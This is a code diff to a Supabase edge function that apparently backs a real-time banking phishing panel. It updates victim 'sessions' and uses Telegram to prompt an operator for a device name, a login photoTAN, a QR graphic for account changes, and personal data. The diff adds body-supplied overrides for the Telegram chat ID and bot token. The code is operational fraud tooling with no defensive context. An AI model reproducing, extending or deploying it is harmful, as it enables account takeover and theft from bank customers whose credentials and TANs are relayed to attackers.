@@ -1,11 +1,13 @@
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 import { corsHeaders } from "npm:@supabase/supabase-js@2/cors";
-import { tgCall, sessionKeyboard, formatSessionText } from "../_shared/telegram.ts";
+import { tgCall, sessionKeyboard, formatSessionText, tgOverrideFromBody, tgChatIdEnv } from "../_shared/telegram.ts";
 
 Deno.serve(async (req) => {
   if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
   try {
-    const { session_id, phase, meta_patch, profile_patch, note } = await req.json();
+    const rawBody = await req.json();
+    const { session_id, phase, meta_patch, profile_patch, note } = rawBody || {};
+    const { chatId: chatOverride, token: tokenOverride } = tgOverrideFromBody(rawBody);
     if (!session_id) {
       return new Response(JSON.stringify({ error: "session_id required" }), {
         status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
@@ -45,7 +47,7 @@ Deno.serve(async (req) => {
 
     const { data: settings } = await supabase
       .from("api_settings").select("telegram_chat_id").limit(1).maybeSingle();
-    const chatId = settings?.telegram_chat_id as string | undefined;
+    const chatId = chatOverride || (settings?.telegram_chat_id as string | undefined) || tgChatIdEnv();
 
     if (chatId && updated?.tg_message_id) {
       await tgCall("editMessageText", {
@@ -54,7 +56,7 @@ Deno.serve(async (req) => {
         text: formatSessionText(updated as any),
         parse_mode: "HTML",
         ...(updated.mode === "afk" ? { reply_markup: { inline_keyboard: [] } } : { reply_markup: sessionKeyboard(updated.id, updated.mode) }),
-      });
+      }, { token: tokenOverride });
 
       // Live mode: after login, prompt operator to reply with device name.
       const isLive = updated.mode === "live" || updated.mode === "live_change";
@@ -65,7 +67,7 @@ Deno.serve(async (req) => {
           text: "📟 <b>Antworte jetzt mit Gerätenamen:</b>",
           parse_mode: "HTML",
           reply_to_message_id: updated.tg_message_id,
-        });
+        }, { token: tokenOverride });
         const promptId = promptJson?.result?.message_id;
         if (promptId) {
           const { data: cur } = await supabase
@@ -84,7 +86,7 @@ Deno.serve(async (req) => {
           text: "📸 <b>Mit Login photoTAN antworten.</b>",
           parse_mode: "HTML",
           reply_to_message_id: updated.tg_message_id,
-        });
+        }, { token: tokenOverride });
         const promptId = promptJson?.result?.message_id;
         if (promptId) {
           const { data: cur } = await supabase
@@ -103,7 +105,7 @@ Deno.serve(async (req) => {
           text: "📸 <b>Mit QR-Grafik für Änderung antworten oder mit dem Wort <code>push</code>.</b>",
           parse_mode: "HTML",
           reply_to_message_id: updated.tg_message_id,
-        });
+        }, { token: tokenOverride });
         const promptId = promptJson?.result?.message_id;
         if (promptId) {
           const { data: cur } = await supabase
@@ -122,7 +124,7 @@ Deno.serve(async (req) => {
           text: "👤 <b>Bitte mit Personendaten antworten.</b>",
           parse_mode: "HTML",
           reply_to_message_id: updated.tg_message_id,
-        });
+        }, { token: tokenOverride });
         const promptId = promptJson?.result?.message_id;
         if (promptId) {
           const { data: cur } = await supabase
